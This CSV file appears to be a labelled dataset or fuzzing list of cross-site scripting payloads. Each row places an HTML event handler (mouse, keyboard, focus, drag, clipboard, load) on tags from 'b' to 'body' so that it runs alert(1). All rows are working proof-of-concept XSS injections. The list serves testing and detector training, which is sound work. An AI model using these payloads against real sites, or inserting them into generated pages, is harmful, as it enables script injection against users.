payload,attack
"<b oncut=""alert(1)"" contenteditable>test</b>",XSS
"<b ondblclick=""alert(1)"">test</b>",XSS
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>,XSS
"<b onkeydown=""alert(1)"" contenteditable>test</b>",XSS
"<b onkeypress=""alert(1)"" contenteditable>test</b>",XSS
"<b onkeyup=""alert(1)"" contenteditable>test</b>",XSS
"<b onmousedown=""alert(1)"">test</b>",XSS
"<b onmouseenter=""alert(1)"">test</b>",XSS
"<b onmouseleave=""alert(1)"">test</b>",XSS
"<b onmousemove=""alert(1)"">test</b>",XSS
"<b onmouseout=""alert(1)"">test</b>",XSS
"<b onmouseover=""alert(1)"">test</b>",XSS
"<b onmouseup=""alert(1)"">test</b>",XSS
"<b onpaste=""alert(1)"" contenteditable>test</b>",XSS
"<base draggable=""true"" ondrag=""alert(1)"">test</base>",XSS
"<base draggable=""true"" ondragend=""alert(1)"">test</base>",XSS
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",XSS
"<base draggable=""true"" ondragleave=""alert(1)"">test</base>",XSS
"<base draggable=""true"" ondragstart=""alert(1)"">test</base>",XSS
<base id=x tabindex=1 onactivate=alert(1)></base>,XSS
<base id=x tabindex=1 onbeforeactivate=alert(1)></base>,XSS
<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>,XSS
<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>,XSS
<base id=x tabindex=1 onfocus=alert(1)></base>,XSS
<base id=x tabindex=1 onfocusin=alert(1)></base>,XSS
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",XSS
"<base onbeforecut=""alert(1)"" contenteditable>test</base>",XSS
"<base onbeforepaste=""alert(1)"" contenteditable>test</base>",XSS
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>,XSS
"<base onclick=""alert(1)"">test</base>",XSS
"<base oncontextmenu=""alert(1)"">test</base>",XSS
"<base oncopy=""alert(1)"" contenteditable>test</base>",XSS
"<base oncut=""alert(1)"" contenteditable>test</base>",XSS
"<base ondblclick=""alert(1)"">test</base>",XSS
<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>,XSS
"<base onkeydown=""alert(1)"" contenteditable>test</base>",XSS
"<base onkeypress=""alert(1)"" contenteditable>test</base>",XSS
"<base onkeyup=""alert(1)"" contenteditable>test</base>",XSS
"<base onmousedown=""alert(1)"">test</base>",XSS
"<base onmouseenter=""alert(1)"">test</base>",XSS
"<base onmouseleave=""alert(1)"">test</base>",XSS
"<base onmousemove=""alert(1)"">test</base>",XSS
"<base onmouseout=""alert(1)"">test</base>",XSS
"<base onmouseover=""alert(1)"">test</base>",XSS
"<base onmouseup=""alert(1)"">test</base>",XSS
"<base onpaste=""alert(1)"" contenteditable>test</base>",XSS
"<basefont draggable=""true"" ondrag=""alert(1)"">test</basefont>",XSS
"<basefont draggable=""true"" ondragend=""alert(1)"">test</basefont>",XSS
"<basefont draggable=""true"" ondragenter=""alert(1)"">test</basefont>",XSS
"<basefont draggable=""true"" ondragleave=""alert(1)"">test</basefont>",XSS
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",XSS
<basefont id=x tabindex=1 onactivate=alert(1)></basefont>,XSS
<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>,XSS
<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>,XSS
<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>,XSS
<basefont id=x tabindex=1 onfocus=alert(1)></basefont>,XSS
<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>,XSS
"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>",XSS
"<basefont onbeforecut=""alert(1)"" contenteditable>test</basefont>",XSS
"<basefont onbeforepaste=""alert(1)"" contenteditable>test</basefont>",XSS
<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>,XSS
"<basefont onclick=""alert(1)"">test</basefont>",XSS
"<basefont oncontextmenu=""alert(1)"">test</basefont>",XSS
"<basefont oncopy=""alert(1)"" contenteditable>test</basefont>",XSS
"<basefont oncut=""alert(1)"" contenteditable>test</basefont>",XSS
"<basefont ondblclick=""alert(1)"">test</basefont>",XSS
<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,XSS
"<basefont onkeydown=""alert(1)"" contenteditable>test</basefont>",XSS
"<basefont onkeypress=""alert(1)"" contenteditable>test</basefont>",XSS
"<basefont onkeyup=""alert(1)"" contenteditable>test</basefont>",XSS
"<basefont onmousedown=""alert(1)"">test</basefont>",XSS
"<basefont onmouseenter=""alert(1)"">test</basefont>",XSS
"<basefont onmouseleave=""alert(1)"">test</basefont>",XSS
"<basefont onmousemove=""alert(1)"">test</basefont>",XSS
"<basefont onmouseout=""alert(1)"">test</basefont>",XSS
"<basefont onmouseover=""alert(1)"">test</basefont>",XSS
"<basefont onmouseup=""alert(1)"">test</basefont>",XSS
"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",XSS
"<bdi draggable=""true"" ondrag=""alert(1)"">test</bdi>",XSS
"<bdi draggable=""true"" ondragend=""alert(1)"">test</bdi>",XSS
"<bdi draggable=""true"" ondragenter=""alert(1)"">test</bdi>",XSS
"<bdi draggable=""true"" ondragleave=""alert(1)"">test</bdi>",XSS
"<bdi draggable=""true"" ondragstart=""alert(1)"">test</bdi>",XSS
<bdi id=x tabindex=1 onactivate=alert(1)></bdi>,XSS
<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>,XSS
<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>,XSS
<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>,XSS
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,XSS
<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>,XSS
"<bdi onbeforecopy=""alert(1)"" contenteditable>test</bdi>",XSS
"<bdi onbeforecut=""alert(1)"" contenteditable>test</bdi>",XSS
"<bdi onbeforepaste=""alert(1)"" contenteditable>test</bdi>",XSS
<bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>,XSS
"<bdi onclick=""alert(1)"">test</bdi>",XSS
"<bdi oncontextmenu=""alert(1)"">test</bdi>",XSS
"<bdi oncopy=""alert(1)"" contenteditable>test</bdi>",XSS
"<bdi oncut=""alert(1)"" contenteditable>test</bdi>",XSS
"<bdi ondblclick=""alert(1)"">test</bdi>",XSS
<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>,XSS
"<bdi onkeydown=""alert(1)"" contenteditable>test</bdi>",XSS
"<bdi onkeypress=""alert(1)"" contenteditable>test</bdi>",XSS
"<bdi onkeyup=""alert(1)"" contenteditable>test</bdi>",XSS
"<bdi onmousedown=""alert(1)"">test</bdi>",XSS
"<bdi onmouseenter=""alert(1)"">test</bdi>",XSS
"<bdi onmouseleave=""alert(1)"">test</bdi>",XSS
"<bdi onmousemove=""alert(1)"">test</bdi>",XSS
"<bdi onmouseout=""alert(1)"">test</bdi>",XSS
"<bdi onmouseover=""alert(1)"">test</bdi>",XSS
"<bdi onmouseup=""alert(1)"">test</bdi>",XSS
"<bdi onpaste=""alert(1)"" contenteditable>test</bdi>",XSS
"<bdo draggable=""true"" ondrag=""alert(1)"">test</bdo>",XSS
"<bdo draggable=""true"" ondragend=""alert(1)"">test</bdo>",XSS
"<bdo draggable=""true"" ondragenter=""alert(1)"">test</bdo>",XSS
"<bdo draggable=""true"" ondragleave=""alert(1)"">test</bdo>",XSS
"<bdo draggable=""true"" ondragstart=""alert(1)"">test</bdo>",XSS
<bdo id=x tabindex=1 onactivate=alert(1)></bdo>,XSS
<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>,XSS
<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>,XSS
<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>,XSS
<bdo id=x tabindex=1 onfocus=alert(1)></bdo>,XSS
<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,XSS
"<bdo onbeforecopy=""alert(1)"" contenteditable>test</bdo>",XSS
"<bdo onbeforecut=""alert(1)"" contenteditable>test</bdo>",XSS
"<bdo onbeforepaste=""alert(1)"" contenteditable>test</bdo>",XSS
<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>,XSS
"<bdo onclick=""alert(1)"">test</bdo>",XSS
"<bdo oncontextmenu=""alert(1)"">test</bdo>",XSS
"<bdo oncopy=""alert(1)"" contenteditable>test</bdo>",XSS
"<bdo oncut=""alert(1)"" contenteditable>test</bdo>",XSS
"<bdo ondblclick=""alert(1)"">test</bdo>",XSS
<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>,XSS
"<bdo onkeydown=""alert(1)"" contenteditable>test</bdo>",XSS
"<bdo onkeypress=""alert(1)"" contenteditable>test</bdo>",XSS
"<bdo onkeyup=""alert(1)"" contenteditable>test</bdo>",XSS
"<bdo onmousedown=""alert(1)"">test</bdo>",XSS
"<bdo onmouseenter=""alert(1)"">test</bdo>",XSS
"<bdo onmouseleave=""alert(1)"">test</bdo>",XSS
"<bdo onmousemove=""alert(1)"">test</bdo>",XSS
"<bdo onmouseout=""alert(1)"">test</bdo>",XSS
"<bdo onmouseover=""alert(1)"">test</bdo>",XSS
"<bdo onmouseup=""alert(1)"">test</bdo>",XSS
"<bdo onpaste=""alert(1)"" contenteditable>test</bdo>",XSS
"<bgsound draggable=""true"" ondrag=""alert(1)"">test</bgsound>",XSS
"<bgsound draggable=""true"" ondragend=""alert(1)"">test</bgsound>",XSS
"<bgsound draggable=""true"" ondragenter=""alert(1)"">test</bgsound>",XSS
"<bgsound draggable=""true"" ondragleave=""alert(1)"">test</bgsound>",XSS
"<bgsound draggable=""true"" ondragstart=""alert(1)"">test</bgsound>",XSS
<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>,XSS
<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>,XSS
<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>,XSS
<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>,XSS
<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>,XSS
<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>,XSS
"<bgsound onbeforecopy=""alert(1)"" contenteditable>test</bgsound>",XSS
"<bgsound onbeforecut=""alert(1)"" contenteditable>test</bgsound>",XSS
"<bgsound onbeforepaste=""alert(1)"" contenteditable>test</bgsound>",XSS
<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>,XSS
"<bgsound onclick=""alert(1)"">test</bgsound>",XSS
"<bgsound oncontextmenu=""alert(1)"">test</bgsound>",XSS
"<bgsound oncopy=""alert(1)"" contenteditable>test</bgsound>",XSS
"<bgsound oncut=""alert(1)"" contenteditable>test</bgsound>",XSS
"<bgsound ondblclick=""alert(1)"">test</bgsound>",XSS
<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>,XSS
"<bgsound onkeydown=""alert(1)"" contenteditable>test</bgsound>",XSS
"<bgsound onkeypress=""alert(1)"" contenteditable>test</bgsound>",XSS
"<bgsound onkeyup=""alert(1)"" contenteditable>test</bgsound>",XSS
"<bgsound onmousedown=""alert(1)"">test</bgsound>",XSS
"<bgsound onmouseenter=""alert(1)"">test</bgsound>",XSS
"<bgsound onmouseleave=""alert(1)"">test</bgsound>",XSS
"<bgsound onmousemove=""alert(1)"">test</bgsound>",XSS
"<bgsound onmouseout=""alert(1)"">test</bgsound>",XSS
"<bgsound onmouseover=""alert(1)"">test</bgsound>",XSS
"<bgsound onmouseup=""alert(1)"">test</bgsound>",XSS
"<bgsound onpaste=""alert(1)"" contenteditable>test</bgsound>",XSS
"<big draggable=""true"" ondrag=""alert(1)"">test</big>",XSS
"<big draggable=""true"" ondragend=""alert(1)"">test</big>",XSS
"<big draggable=""true"" ondragenter=""alert(1)"">test</big>",XSS
"<big draggable=""true"" ondragleave=""alert(1)"">test</big>",XSS
"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",XSS
<big id=x tabindex=1 onactivate=alert(1)></big>,XSS
<big id=x tabindex=1 onbeforeactivate=alert(1)></big>,XSS
<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>,XSS
<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>,XSS
<big id=x tabindex=1 onfocus=alert(1)></big>,XSS
<big id=x tabindex=1 onfocusin=alert(1)></big>,XSS
"<big onbeforecopy=""alert(1)"" contenteditable>test</big>",XSS
"<big onbeforecut=""alert(1)"" contenteditable>test</big>",XSS
"<big onbeforepaste=""alert(1)"" contenteditable>test</big>",XSS
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,XSS
"<big onclick=""alert(1)"">test</big>",XSS
"<big oncontextmenu=""alert(1)"">test</big>",XSS
"<big oncopy=""alert(1)"" contenteditable>test</big>",XSS
"<big oncut=""alert(1)"" contenteditable>test</big>",XSS
"<big ondblclick=""alert(1)"">test</big>",XSS
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,XSS
"<big onkeydown=""alert(1)"" contenteditable>test</big>",XSS
"<big onkeypress=""alert(1)"" contenteditable>test</big>",XSS
"<big onkeyup=""alert(1)"" contenteditable>test</big>",XSS
"<big onmousedown=""alert(1)"">test</big>",XSS
"<big onmouseenter=""alert(1)"">test</big>",XSS
"<big onmouseleave=""alert(1)"">test</big>",XSS
"<big onmousemove=""alert(1)"">test</big>",XSS
"<big onmouseout=""alert(1)"">test</big>",XSS
"<big onmouseover=""alert(1)"">test</big>",XSS
"<big onmouseup=""alert(1)"">test</big>",XSS
"<big onpaste=""alert(1)"" contenteditable>test</big>",XSS
"<blink draggable=""true"" ondrag=""alert(1)"">test</blink>",XSS
"<blink draggable=""true"" ondragend=""alert(1)"">test</blink>",XSS
"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>",XSS
"<blink draggable=""true"" ondragleave=""alert(1)"">test</blink>",XSS
"<blink draggable=""true"" ondragstart=""alert(1)"">test</blink>",XSS
<blink id=x tabindex=1 onactivate=alert(1)></blink>,XSS
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,XSS
<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>,XSS
<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>,XSS
<blink id=x tabindex=1 onfocus=alert(1)></blink>,XSS
<blink id=x tabindex=1 onfocusin=alert(1)></blink>,XSS
"<blink onbeforecopy=""alert(1)"" contenteditable>test</blink>",XSS
"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>",XSS
"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",XSS
<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>,XSS
"<blink onclick=""alert(1)"">test</blink>",XSS
"<blink oncontextmenu=""alert(1)"">test</blink>",XSS
"<blink oncopy=""alert(1)"" contenteditable>test</blink>",XSS
"<blink oncut=""alert(1)"" contenteditable>test</blink>",XSS
"<blink ondblclick=""alert(1)"">test</blink>",XSS
<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>,XSS
"<blink onkeydown=""alert(1)"" contenteditable>test</blink>",XSS
"<blink onkeypress=""alert(1)"" contenteditable>test</blink>",XSS
"<blink onkeyup=""alert(1)"" contenteditable>test</blink>",XSS
"<blink onmousedown=""alert(1)"">test</blink>",XSS
"<blink onmouseenter=""alert(1)"">test</blink>",XSS
"<blink onmouseleave=""alert(1)"">test</blink>",XSS
"<blink onmousemove=""alert(1)"">test</blink>",XSS
"<blink onmouseout=""alert(1)"">test</blink>",XSS
"<blink onmouseover=""alert(1)"">test</blink>",XSS
"<blink onmouseup=""alert(1)"">test</blink>",XSS
"<blink onpaste=""alert(1)"" contenteditable>test</blink>",XSS
"<blockquote draggable=""true"" ondrag=""alert(1)"">test</blockquote>",XSS
"<blockquote draggable=""true"" ondragend=""alert(1)"">test</blockquote>",XSS
"<blockquote draggable=""true"" ondragenter=""alert(1)"">test</blockquote>",XSS
"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>",XSS
"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",XSS
<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>,XSS
<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>,XSS
<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>,XSS
<blockquote id=x tabindex=1 ondeactivate=alert(1)></blockquote><input id=y autofocus>,XSS
<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>,XSS
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,XSS
"<blockquote onbeforecopy=""alert(1)"" contenteditable>test</blockquote>",XSS
"<blockquote onbeforecut=""alert(1)"" contenteditable>test</blockquote>",XSS
"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",XSS
<blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>,XSS
"<blockquote onclick=""alert(1)"">test</blockquote>",XSS
"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",XSS
"<blockquote oncopy=""alert(1)"" contenteditable>test</blockquote>",XSS
"<blockquote oncut=""alert(1)"" contenteditable>test</blockquote>",XSS
"<blockquote ondblclick=""alert(1)"">test</blockquote>",XSS
<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>,XSS
"<blockquote onkeydown=""alert(1)"" contenteditable>test</blockquote>",XSS
"<blockquote onkeypress=""alert(1)"" contenteditable>test</blockquote>",XSS
"<blockquote onkeyup=""alert(1)"" contenteditable>test</blockquote>",XSS
"<blockquote onmousedown=""alert(1)"">test</blockquote>",XSS
"<blockquote onmouseenter=""alert(1)"">test</blockquote>",XSS
"<blockquote onmouseleave=""alert(1)"">test</blockquote>",XSS
"<blockquote onmousemove=""alert(1)"">test</blockquote>",XSS
"<blockquote onmouseout=""alert(1)"">test</blockquote>",XSS
"<blockquote onmouseover=""alert(1)"">test</blockquote>",XSS
"<blockquote onmouseup=""alert(1)"">test</blockquote>",XSS
"<blockquote onpaste=""alert(1)"" contenteditable>test</blockquote>",XSS
"<body draggable=""true"" ondrag=""alert(1)"">test</body>",XSS
"<body draggable=""true"" ondragend=""alert(1)"">test</body>",XSS
"<body draggable=""true"" ondragenter=""alert(1)"">test</body>",XSS
"<body draggable=""true"" ondragleave=""alert(1)"">test</body>",XSS
"<body draggable=""true"" ondragstart=""alert(1)"">test</body>",XSS
<body id=x tabindex=1 onactivate=alert(1)></body>,XSS
<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,XSS
<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>,XSS
<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>,XSS
<body id=x tabindex=1 onfocus=alert(1)></body>,XSS
<body id=x tabindex=1 onfocusin=alert(1)></body>,XSS
<body onafterprint=alert(1)>,XSS
"<body onbeforecopy=""alert(1)"" contenteditable>test</body>",XSS
"<body onbeforecut=""alert(1)"" contenteditable>test</body>",XSS
"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",XSS
<body onbeforeprint=alert(1)>,XSS
"<body onbeforeunload=""location='javascript:alert(1)'"">",XSS
<body onblur=alert(1) id=x><iframe id=x>,XSS
"<body onclick=""alert(1)"">test</body>",XSS
"<body oncontextmenu=""alert(1)"">test</body>",XSS
"<body oncopy=""alert(1)"" contenteditable>test</body>",XSS
"<body oncut=""alert(1)"" contenteditable>test</body>",XSS
"<body ondblclick=""alert(1)"">test</body>",XSS
<body onerror=alert(1) onload=/>,XSS
<body onfocusout=alert(1) id=x><iframe id=x>,XSS
"<body onhashchange=""alert(1)"">",XSS
"<body onkeydown=""alert(1)"" contenteditable>test</body>",XSS
"<body onkeypress=""alert(1)"" contenteditable>test</body>",XSS
"<body onkeyup=""alert(1)"" contenteditable>test</body>",XSS
<body onload=alert(1)>,XSS
<body onmessage=alert(1)>,XSS
"<body onmousedown=""alert(1)"">test</body>",XSS
"<body onmouseenter=""alert(1)"">test</body>",XSS
"<body onmouseleave=""alert(1)"">test</body>",XSS
"<body onmousemove=""alert(1)"">test</body>",XSS
"<body onmouseout=""alert(1)"">test</body>",XSS
"<body onmouseover=""alert(1)"">test</body>",XSS
"<body onmouseup=""alert(1)"">test</body>",XSS
